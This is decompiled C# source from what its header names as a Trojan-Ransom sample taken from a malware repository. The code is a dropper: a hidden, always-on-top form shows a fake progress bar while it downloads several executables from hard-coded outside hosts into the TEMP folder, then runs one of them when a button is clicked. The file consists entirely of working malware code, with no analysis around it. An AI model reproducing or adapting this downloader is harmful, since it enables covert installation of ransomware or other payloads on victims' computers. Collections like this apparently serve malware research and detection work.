// Decompiled with JetBrains decompiler
// Type: dgtroWkeyaLKqLJKnUyp.screenstart
// Assembly: dgtroWkeyaLKqLJKnUyp, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9AACAD1A-2399-4E58-B577-7365648D1225
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\VHO-Trojan-Ransom.Win32.Foreign.gen-7b660b8d7016e0595441c8700aa26c095425b310.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace dgtroWkeyaLKqLJKnUyp
{
  public class screenstart : Form
  {
    private IContainer components;
    private WebBrowser navegador_1;
    private Panel painel_inicial;
    private Label lb_carregando;
    private ProgressBar barra_progresso;
    private System.Windows.Forms.Timer clock;
    private BackgroundWorker worker_fundo;
    private System.Windows.Forms.Timer valida_NAV;
    private Panel panel1;
    private Button button1;
    private Label lb_porc;
    public string dgtroWkeyaLKqLJKnUyp_1 = "http://tekfish.net/130213s/130213i.htm";
    private bool dgtroWkeyaLKqLJKnUyp_2;
    private bool dgtroWkeyaLKqLJKnUyp_3;
    private int dgtroWkeyaLKqLJKnUyp_4;
    private List<Array> dgtroWkeyaLKqLJKnUyp_5 = new List<Array>();
    private int dgtroWkeyaLKqLJKnUyp_6;
    private string dgtroWkeyaLKqLJKnUyp_7 = "";
    private string dgtroWkeyaLKqLJKnUyp_8 = "";
    private string dgtroWkeyaLKqLJKnUyp_9 = "";
    private int dgtroWkeyaLKqLJKnUyp_10;
    private string dgtroWkeyaLKqLJKnUyp_11 = "";

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (screenstart));
      this.navegador_1 = new WebBrowser();
      this.painel_inicial = new Panel();
      this.lb_porc = new Label();
      this.panel1 = new Panel();
      this.button1 = new Button();
      this.lb_carregando = new Label();
      this.barra_progresso = new ProgressBar();
      this.clock = new System.Windows.Forms.Timer(this.components);
      this.worker_fundo = new BackgroundWorker();
      this.valida_NAV = new System.Windows.Forms.Timer(this.components);
      this.painel_inicial.SuspendLayout();
      this.panel1.SuspendLayout();
      this.SuspendLayout();
      this.navegador_1.Location = new Point(27, 95);
      this.navegador_1.MinimumSize = new Size(20, 20);
      this.navegador_1.Name = "navegador_1";
      this.navegador_1.Size = new Size(326, 250);
      this.navegador_1.TabIndex = 10;
      this.navegador_1.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(this.navegador_1_DocumentCompleted);
      this.painel_inicial.BorderStyle = BorderStyle.FixedSingle;
      this.painel_inicial.Controls.Add((Control) this.lb_porc);
      this.painel_inicial.Controls.Add((Control) this.panel1);
      this.painel_inicial.Controls.Add((Control) this.lb_carregando);
      this.painel_inicial.Controls.Add((Control) this.barra_progresso);
      this.painel_inicial.Location = new Point(3, 6);
      this.painel_inicial.Name = "painel_inicial";
      this.painel_inicial.Size = new Size(347, 62);
      this.painel_inicial.TabIndex = 9;
      this.lb_porc.AutoSize = true;
      this.lb_porc.Location = new Point(312, 32);
      this.lb_porc.Name = "lb_porc";
      this.lb_porc.Size = new Size(0, 13);
      this.lb_porc.TabIndex = 9;
      this.panel1.Controls.Add((Control) this.button1);
      this.panel1.Location = new Point(4, 4);
      this.panel1.Name = "panel1";
      this.panel1.Size = new Size(336, 53);
      this.panel1.TabIndex = 8;
      this.panel1.Visible = false;
      this.button1.Image = (Image) componentResourceManager.GetObject("button1.Image");
      this.button1.Location = new Point(92, 5);
      this.button1.Name = "button1";
      this.button1.Size = new Size(158, 42);
      this.button1.TabIndex = 7;
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.lb_carregando.Location = new Point(8, 9);
      this.lb_carregando.Name = "lb_carregando";
      this.lb_carregando.Size = new Size(102, 13);
      this.lb_carregando.TabIndex = 7;
      this.barra_progresso.Location = new Point(8, 28);
      this.barra_progresso.Name = "barra_progresso";
      this.barra_progresso.Size = new Size(301, 23);
      this.barra_progresso.TabIndex = 3;
      this.clock.Tick += new EventHandler(this.clock_Tick);
      this.worker_fundo.WorkerReportsProgress = true;
      this.worker_fundo.DoWork += new DoWorkEventHandler(this.bg_w_DoWork);
      this.worker_fundo.ProgressChanged += new ProgressChangedEventHandler(this.bg_w_ProgressChanged);
      this.worker_fundo.RunWorkerCompleted += new RunWorkerCompletedEventHandler(this.bg_w_RunWorkerCompleted);
      this.valida_NAV.Enabled = true;
      this.valida_NAV.Tick += new EventHandler(this.check_IE_Tick);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(356, 75);
      this.Controls.Add((Control) this.navegador_1);
      this.Controls.Add((Control) this.painel_inicial);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (screenstart);
      this.Opacity = 0.9;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Form1";
      this.TopMost = true;
      this.FormClosed += new FormClosedEventHandler(this.tela_inicial_FormClosed);
      this.Load += new EventHandler(this.janelainicial);
      this.painel_inicial.ResumeLayout(false);
      this.painel_inicial.PerformLayout();
      this.panel1.ResumeLayout(false);
      this.ResumeLayout(false);
    }

    public screenstart() => this.InitializeComponent();

    private void janelainicial(object sender, EventArgs e)
    {
      this.clock.Enabled = true;
      List<Array> arrayList = new List<Array>();
      this.dgtroWkeyaLKqLJKnUyp_5.Add((Array) new string[6]
      {
        "http://zoomtags.net/130213d/260213_f.exe",
        "",
        "0",
        "",
        "TEMP",
        "http://tekfish.net/130213s/130213c.htm"
      });
      this.dgtroWkeyaLKqLJKnUyp_5.Add((Array) new string[6]
      {
        "http://zoomtags.net/130213d/260213_dply.exe",
        "",
        "0",
        "",
        "TEMP",
        ""
      });
      this.dgtroWkeyaLKqLJKnUyp_5.Add((Array) new string[6]
      {
        "http://zoomtags.net/130213d/260213_d.exe",
        "",
        "1",
        "",
        "TEMP",
        ""
      });
      this.dgtroWkeyaLKqLJKnUyp_5.Add((Array) new string[6]
      {
        "",
        "",
        "",
        "",
        "DESKTOP",
        ""
      });
      this.dgtroWkeyaLKqLJKnUyp_5.Add((Array) new string[6]
      {
        "",
        "",
        "",
        "",
        "DESKTOP",
        ""
      });
      this.dgtroWkeyaLKqLJKnUyp_5.Add((Array) new string[6]
      {
        "",
        "",
        "",
        "",
        "DESKTOP",
        ""
      });
      this.dgtroWkeyaLKqLJKnUyp_5.Add((Array) new string[6]
      {
        "",
        "",
        "",
        "",
        "DESKTOP",
        ""
      });
      this.dgtroWkeyaLKqLJKnUyp_5.Add((Array) new string[6]
      {
        "",
        "",
        "",
        "",
        "DESKTOP",
        ""
      });
      this.dgtroWkeyaLKqLJKnUyp_5.Add((Array) new string[6]
      {
        "",
        "",
        "",
        "",
        "DESKTOP",
        ""
      });
      foreach (string[] strArray in this.dgtroWkeyaLKqLJKnUyp_5)
      {
        if (strArray[0].Length > 0)
          arrayList.Add((Array) strArray);
      }
      this.dgtroWkeyaLKqLJKnUyp_5 = arrayList;
    }

    private void tela_inicial_FormClosed(object sender, FormClosedEventArgs e) => Environment.Exit(1);

    private void clock_Tick(object sender, EventArgs e)
    {
      this.navegador_1.Url = new Uri(this.dgtroWkeyaLKqLJKnUyp_1);
      this.worker_fundo.RunWorkerAsync();
      this.clock.Enabled = false;
    }

    private void bg_w_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
    {
      int wkeyaLkqLjKnUyp6 = this.dgtroWkeyaLKqLJKnUyp_6;
      if (this.dgtroWkeyaLKqLJKnUyp_11.Length > 0)
        this.navegador_1.Url = new Uri(this.dgtroWkeyaLKqLJKnUyp_11);
      if (this.dgtroWkeyaLKqLJKnUyp_4 == this.dgtroWkeyaLKqLJKnUyp_5.Count)
        this.panel1.Visible = true;
      else
        this.worker_fundo.RunWorkerAsync();
    }

    private void bg_w_ProgressChanged(object sender, ProgressChangedEventArgs e)
    {
      this.barra_progresso.Value = e.ProgressPercentage;
      this.lb_porc.Text = e.ProgressPercentage.ToString() + "%";
    }

    private void bg_w_DoWork(object sender, DoWorkEventArgs e)
    {
      string uriString = "";
      string str1 = "";
      string str2 = "";
      int num1 = 0;
      foreach (string[] strArray1 in this.dgtroWkeyaLKqLJKnUyp_5)
      {
        if (num1 == this.dgtroWkeyaLKqLJKnUyp_4)
        {
          uriString = strArray1[0];
          if (strArray1[1].Length == 0)
          {
            string[] strArray2 = strArray1[0].Split('/');
            str2 = strArray2[strArray2.Length - 1];
          }
          else
            str2 = strArray1[1];
          this.dgtroWkeyaLKqLJKnUyp_6 = int.Parse(strArray1[2]);
          this.dgtroWkeyaLKqLJKnUyp_8 = strArray1[3];
          str1 = strArray1[4];
          this.dgtroWkeyaLKqLJKnUyp_11 = strArray1[5];
          ++this.dgtroWkeyaLKqLJKnUyp_4;
          break;
        }
        ++num1;
      }
      if (uriString.Length <= 0)
        return;
      if (str1.Equals("TEMP"))
        str1 = Environment.GetEnvironmentVariable("TEMP") + "\\";
      if (str1.Equals("DESKTOP"))
        str1 = Environment.GetEnvironmentVariable("USERPROFILE") + "\\Desktop\\";
      this.dgtroWkeyaLKqLJKnUyp_9 = str1;
      this.dgtroWkeyaLKqLJKnUyp_7 = str2;
      string path = str1 + str2;
      HttpWebResponse response = (HttpWebResponse) WebRequest.Create(new Uri(uriString)).GetResponse();
      response.Close();
      long contentLength = response.ContentLength;
      long num2 = 0;
      using (WebClient webClient = new WebClient())
      {
        using (Stream stream1 = webClient.OpenRead(new Uri(uriString)))
        {
          using (Stream stream2 = (Stream) new FileStream(path, FileMode.Create, FileAccess.Write, FileShare.None))
          {
            byte[] buffer = new byte[contentLength];
            int count;
            while ((count = stream1.Read(buffer, 0, buffer.Length)) > 0)
            {
              stream2.Write(buffer, 0, count);
              num2 += (long) count;
              this.worker_fundo.ReportProgress((int) ((double) num2 / (double) buffer.Length * 100.0));
            }
            stream2.Close();
          }
          stream1.Close();
        }
      }
    }

    private void navegador_1_DocumentCompleted(
      object sender,
      WebBrowserDocumentCompletedEventArgs e)
    {
      if (!this.dgtroWkeyaLKqLJKnUyp_3)
        return;
      Application.Exit();
    }

    private void navegador_2_DocumentCompleted(
      object sender,
      WebBrowserDocumentCompletedEventArgs e)
    {
    }

    private void check_IE_Tick(object sender, EventArgs e)
    {
      if (!this.dgtroWkeyaLKqLJKnUyp_2)
        return;
      Environment.Exit(1);
    }

    private void button2_Click(object sender, EventArgs e)
    {
      foreach (string[] strArray1 in this.dgtroWkeyaLKqLJKnUyp_5)
      {
        string str1;
        if (strArray1[1].Length == 0)
        {
          string[] strArray2 = strArray1[0].Split('/');
          str1 = strArray2[strArray2.Length - 1];
        }
        else
          str1 = strArray1[1];
        string str2 = strArray1[4];
        if (str2.Length > 0)
        {
          if (str2.Equals("TEMP"))
            str2 = Environment.GetEnvironmentVariable("TEMP") + "\\";
          if (str2.Equals("DESKTOP"))
            str2 = Environment.GetEnvironmentVariable("USERPROFILE") + "\\Desktop\\";
          System.IO.File.Delete(str2 + str1);
        }
      }
      Application.Exit();
    }

    private void button1_Click(object sender, EventArgs e)
    {
      string str1 = "";
      foreach (string[] strArray1 in this.dgtroWkeyaLKqLJKnUyp_5)
      {
        string str2;
        if (strArray1[1].Length == 0)
        {
          string[] strArray2 = strArray1[0].Split('/');
          str2 = strArray2[strArray2.Length - 1];
        }
        else
          str2 = strArray1[1];
        string arguments = strArray1[3];
        string str3 = strArray1[4];
        int num = int.Parse(strArray1[2]);
        if (str3.Length > 0 && num == 1)
        {
          if (str3.Equals("TEMP"))
            str1 = Environment.GetEnvironmentVariable("TEMP") + "\\";
          if (str3.Equals("DESKTOP"))
            str1 = Environment.GetEnvironmentVariable("USERPROFILE") + "\\Desktop\\";
          Process.Start(str1 + str2, arguments);
        }
      }
      Application.Exit();
    }
  }
}
